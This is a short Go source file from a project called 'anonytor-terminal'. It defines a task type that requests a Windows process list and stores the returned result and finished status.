package windows

import (
	"anonytor-terminal/controller/task"
	"anonytor-terminal/runtime/definition"
)

type GetProcessListTask struct {
	task.Base
	result string
}

func (t *GetProcessListTask) GetCmdType() definition.Cmd {
	return definition.GetProcessList
}

func (t *GetProcessListTask) OnTaskFinished(data string) {
	t.Status = definition.TaskFinished
	t.result = data
}

func (t *GetProcessListTask) GetResult() string {
	return t.result
}
